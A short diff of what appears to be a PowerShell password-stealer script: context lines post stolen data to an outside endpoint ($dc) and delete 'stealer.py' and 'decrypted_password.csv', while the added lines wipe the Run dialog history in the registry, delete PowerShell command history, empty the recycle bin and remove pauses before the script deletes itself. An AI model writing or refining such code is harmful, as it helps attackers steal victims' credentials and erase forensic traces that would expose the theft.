@@ -56,10 +56,10 @@ $headers = @{
 Write-Host "Sending data to $dc"
 Invoke-RestMethod -Uri $dc -Method Post -Headers $headers -Body $body
 
-pause
-
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 Remove-Item stealer.py -Force
 Remove-item decrypted_password.csv -Force
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $MyInvocation.MyCommand.Source
 
-pause
